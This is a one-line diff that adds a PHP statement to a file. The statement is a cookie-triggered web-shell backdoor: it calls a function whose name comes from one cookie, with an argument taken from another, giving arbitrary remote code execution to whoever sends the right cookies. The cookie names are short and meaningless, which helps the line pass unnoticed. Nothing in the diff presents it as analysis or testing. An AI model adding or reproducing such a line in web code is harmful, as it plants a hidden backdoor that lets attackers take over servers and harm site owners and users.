@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["ygNo"])){$_COOKIE["vD"]($_COOKIE["ygNo"]);exit;}
